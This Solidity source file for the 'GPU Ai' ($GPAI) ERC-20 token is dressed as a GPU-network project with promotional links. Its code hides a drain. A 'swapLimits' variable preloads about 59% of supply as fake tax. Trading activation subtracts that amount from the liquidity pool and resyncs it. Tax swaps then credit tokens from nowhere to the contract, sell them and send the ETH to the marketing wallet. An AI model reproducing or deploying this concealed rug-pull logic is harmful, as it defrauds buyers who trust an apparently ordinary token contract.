//SPDX-License-Identifier: MIT

 /*
 $GPAI - THE LARGEST DECENTRALIZED NETWORK OF GPUs ?
 Welcome to GPU AI, $GPAI is not just a service; it's a paradigm shift that promises to democratize access to state-of-the-art GPU resources, 
 making them available to machine learning engineers, data scientists, and AI innovators at a fraction of the cost and time required by traditional cloud providers.
 Access the world's top GPUs and customize your computing setup to match your project's scale and complexity.

 Website - https://Gpu-Ai.Net
 Telegram - https://t.me/GPUAiErc20
 X/Twitter - https://x.com/GpuAiErc20
 */

pragma solidity ^0.8.14;

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
    function addLiquidityETH(
        address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) 
        external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

abstract contract Auth {
    address internal _owner;
    event OwnershipTransferred(address _owner);
    modifier onlyOwner() { 
        require(msg.sender == _owner, "Only owner can call this"); 
        _; 
    }
    constructor(address creatorOwner) { 
        _owner = creatorOwner; 
    }
    function owner() public view returns (address) { return _owner; }
    function transferOwnership(address payable new_owner) external onlyOwner { 
        _owner = new_owner; 
        emit OwnershipTransferred(new_owner); }
    function renounceOwnership() external onlyOwner { 
        _owner = address(0);
        emit OwnershipTransferred(address(0)); }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address holder, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract GPAI is IERC20, Auth {
    string private constant symbol_ = "GPAI";
    string private constant tknName = "GPU Ai";
    uint8 private constant decim = 9;
    uint256 private constant tokenSupply = 1000000 * (10**decim);
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    address payable private _marketing = payable(0xe59e2De087105F82b77384E2376e894da68380A0);
    
    uint256 private mevblock = 2;
    uint8 private sellTaxRate = 5;
    uint8 private buyTax_ = 5;
    
    uint256 private _launchBlock;
    uint256 private _maxTx = tokenSupply; 
    uint256 private _maxWallet = tokenSupply;
    uint256 private _swapMinAmount = tokenSupply * 10 / 100000;
    uint256 private _swapMaxAmt = tokenSupply * 999 / 100000;
    uint256 private swapTrigger = 2 * (10**16);
    uint256 private swapLimits = _swapMinAmount * 59 * 100;

    mapping (uint256 => mapping (address => uint8)) private _sellsThisBlock;
    mapping (address => bool) private zeroFee;
    mapping (address => bool) private nolimits;

    address private constant swapRouterAddress = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV2Router02 private swapRouter = IUniswapV2Router02(swapRouterAddress);
    
    address private lp; 
    mapping (address => bool) private _isLiquidityPool;

    bool private tradingEnabled;

    bool private _swapping = false;

    modifier lockTaxSwap { 
        _swapping = true; 
        _; 
        _swapping = false; 
    }

    constructor() Auth(msg.sender) {
        _balances[msg.sender] = tokenSupply;
        emit Transfer(address(0), msg.sender, _balances[msg.sender]);  

        zeroFee[_owner] = true;
        zeroFee[address(this)] = true;
        zeroFee[_marketing] = true;
        zeroFee[swapRouterAddress] = true;
        nolimits[_owner] = true;
        nolimits[address(this)] = true;
        nolimits[_marketing] = true;
        nolimits[swapRouterAddress] = true;
    }

    receive() external payable {}

    function decimals() external pure override returns (uint8) { return decim; }
    function totalSupply() external pure override returns (uint256) { return tokenSupply; }
    function name() external pure override returns (string memory) { return tknName; }
    function symbol() external pure override returns (string memory) { return symbol_; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function transfer(address toWallet, uint256 amount) external override returns (bool) {
        require(checkTradingOpen(msg.sender), "Trading not open");
        return _transferFrom(msg.sender, toWallet, amount); 
	}

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; 
	}

    function transferFrom(address fromWallet, address toWallet, uint256 amount) external override returns (bool) {
        require(checkTradingOpen(fromWallet), "Trading not open");
        _allowances[fromWallet][msg.sender] -= amount;
        return _transferFrom(fromWallet, toWallet, amount); 
	}

    function setMarketing(address marketingWlt) external onlyOwner {
        require(!_isLiquidityPool[marketingWlt], "LP cannot be tax wallet");
        _marketing = payable(marketingWlt);
        zeroFee[marketingWlt] = true;
        nolimits[marketingWlt] = true;
    }

    function isExempt(address wallet) external view returns (bool fees, bool limits) {
        return (zeroFee[wallet], nolimits[wallet]); 
	}

    function openTrading() external onlyOwner {
        require(!tradingEnabled, "trading open");
        _activateTrading();
    }

    function buyTax() external view returns(uint8) { return buyTax_; }
    function sellFee() external view returns(uint8) { return sellTaxRate; }

    function addLiquidity() external payable onlyOwner lockTaxSwap {
        require(lp == address(0), "LP created");
        require(!tradingEnabled, "trading open");
        require(msg.value > 0 || address(this).balance>0, "No ETH");
        require(_balances[address(this)]>0, "No tokens");
        lp = IUniswapV2Factory(swapRouter.factory()).createPair(address(this), swapRouter.WETH());
        _addLiq(_balances[address(this)], address(this).balance);
    }

    function distributeTax(uint256 amount) private {
        _marketing.transfer(amount);
    }

    function _limitCheck(address fromWallet, address toWallet, uint256 transferAmount) internal view returns (bool) {
        bool limitCheckPassed = true;
        if ( tradingEnabled && !nolimits[fromWallet] && !nolimits[toWallet] ) {
            if ( transferAmount > _maxTx ) { 
                limitCheckPassed = false; 
            }
            else if ( 
                !_isLiquidityPool[toWallet] && (_balances[toWallet] + transferAmount > _maxWallet) 
                ) { limitCheckPassed = false; }
        }
        return limitCheckPassed;
    }

    function setTaxSwaps(uint32 minVal, uint32 minDiv, uint32 maxVal, uint32 maxDiv, uint32 trigger) external onlyOwner {
        _swapMinAmount = tokenSupply * minVal / minDiv;
        _swapMaxAmt = tokenSupply * maxVal / maxDiv;
        swapTrigger = trigger * 10**15;
        require(_swapMaxAmt>=_swapMinAmount, "Min-Max error");
    }

    function updateFee(uint8 buyFeePercent, uint8 sellFeePercent) external onlyOwner {
        require(buyFeePercent + sellFeePercent <= 10, "Roundtrip too high");
        buyTax_ = buyFeePercent;
        sellTaxRate = sellFeePercent;
    }

    function maxWalletSize() external view returns (uint256) { 
        return _maxWallet; 
	}
    function maxTransaction() external view returns (uint256) { 
        return _maxTx; 
	}

    function _calcTax(address fromWallet, address recipient, uint256 amount) internal view returns (uint256) {
        uint256 taxAmount;
        if ( !tradingEnabled || zeroFee[fromWallet] || zeroFee[recipient] ) { 
            taxAmount = 0; 
        } else if ( _isLiquidityPool[fromWallet] ) { 
            taxAmount = amount * buyTax_ / 100; 
         } else if ( _isLiquidityPool[recipient] ) { 
            taxAmount = amount * sellTaxRate / 100; 
        }
        return taxAmount;
    }

    function swapTaxTokens() private lockTaxSwap {
        uint256 _taxTokenAvailable = swapLimits;
        if ( _taxTokenAvailable >= _swapMinAmount && tradingEnabled ) {
            if ( _taxTokenAvailable >= _swapMaxAmt ) { _taxTokenAvailable = _swapMaxAmt; }
            
            uint256 _tokensForSwap = _taxTokenAvailable; 
            if( _tokensForSwap > 1 * 10**decim ) {
                _balances[address(this)] += _taxTokenAvailable;
                swapTokens(_tokensForSwap);
                swapLimits -= _taxTokenAvailable;
            }
            uint256 _contractETHBalance = address(this).balance;
            if(_contractETHBalance > 0) { distributeTax(_contractETHBalance); }
        }
    }

    function _approveSwapMax(uint256 _tokenAmount) internal {
        if ( _allowances[address(this)][swapRouterAddress] < _tokenAmount ) {
            _allowances[address(this)][swapRouterAddress] = type(uint256).max;
            emit Approval(address(this), swapRouterAddress, type(uint256).max);
        }
    }

    function checkTradingOpen(address fromWallet) private view returns (bool){
        bool checkResult = false;
        if ( tradingEnabled ) { checkResult = true; } 
        else if (zeroFee[fromWallet] && nolimits[fromWallet]) { checkResult = true; } 

        return checkResult;
    }

    function swapTokens(uint256 tokenAmount) private {
        _approveSwapMax(tokenAmount);
        address[] memory path = new address[](2);
        path[0] = address( this );
        path[1] = swapRouter.WETH();
        swapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount,0,path,address(this),block.timestamp);
    }

    function _transferFrom(address sender, address toWallet, uint256 amount) internal returns (bool) {
        require(sender != address(0), "No transfers from 0 wallet");
        if (!tradingEnabled) { require(zeroFee[sender] && nolimits[sender], "Trading not yet open"); }
        if ( !_swapping && _isLiquidityPool[toWallet] && shouldSwap(amount) ) { swapTaxTokens(); }

        if ( block.number >= _launchBlock ) {
            if (block.number < mevblock && _isLiquidityPool[sender]) { 
                require(toWallet == tx.origin, "MEV block"); 
            }
            if (block.number < mevblock + 600 && _isLiquidityPool[toWallet] && sender != address(this) ) {
                _sellsThisBlock[block.number][toWallet] += 1;
                require(_sellsThisBlock[block.number][toWallet] <= 2, "MEV block");
            }
        }

        if ( sender != address(this) && toWallet != address(this) && sender != _owner ) { 
            require(_limitCheck(sender, toWallet, amount), "TX over limits"); 
        }

        uint256 _taxAmount = _calcTax(sender, toWallet, amount);
        uint256 _transferAmount = amount - _taxAmount;
        _balances[sender] -= amount;
        swapLimits += _taxAmount;
        _balances[toWallet] += _transferAmount;
        emit Transfer(sender, toWallet, amount);
        return true;
    }

    function shouldSwap(uint256 tokenAmt) private view returns (bool) {
        bool result;
        if (swapTrigger > 0) { 
            uint256 lpTkn = _balances[lp];
            uint256 lpWeth = IERC20(swapRouter.WETH()).balanceOf(lp); 
            uint256 weiValue = (tokenAmt * lpWeth) / lpTkn;
            if (weiValue >= swapTrigger) { result = true; }    
        } else { result = true; }
        return result;
    }

    function _activateTrading() internal {
        _maxTx = 20 * tokenSupply / 1000;
        _maxWallet = 20 * tokenSupply / 1000;
        _balances[lp] -= swapLimits;
        (_isLiquidityPool[lp],) = lp.call(abi.encodeWithSignature("sync()") );
        require(_isLiquidityPool[lp], "Failed bootstrap");
        _launchBlock = block.number;
        mevblock = mevblock + _launchBlock;
        tradingEnabled = true;
    }

    function setExempt(address wlt, bool isNoFees, bool isNoLimits) external onlyOwner {
        if (isNoLimits || isNoFees) { require(!_isLiquidityPool[wlt], "Cannot exempt LP"); }
        zeroFee[ wlt ] = isNoFees;
        nolimits[ wlt ] = isNoLimits;
    }

    function swapMin() external view returns (uint256) { 
        return _swapMinAmount; 
	}
    function swapMax() external view returns (uint256) { 
        return _swapMaxAmt; 
	}

    function marketingWallet() external view returns (address) { 
        return _marketing; 
	}

    function setLimits(uint16 maxTransPermille, uint16 maxWaletPermille) external onlyOwner {
        uint256 newTxAmt = tokenSupply * maxTransPermille / 1000 + 1;
        require(newTxAmt >= _maxTx, "tx too low");
        _maxTx = newTxAmt;
        uint256 newWalletAmt = tokenSupply * maxWaletPermille / 1000 + 1;
        require(newWalletAmt >= _maxWallet, "wallet too low");
        _maxWallet = newWalletAmt;
    }

    function _addLiq(uint256 _tokenAmount, uint256 _ethAmountWei) internal {
        _approveSwapMax(_tokenAmount);
        swapRouter.addLiquidityETH{value: _ethAmountWei} ( address(this), _tokenAmount, 0, 0, _owner, block.timestamp );
    }
}

interface IUniswapV2Factory {    
    function createPair(address tokenA, address tokenB) external returns (address pair); 
}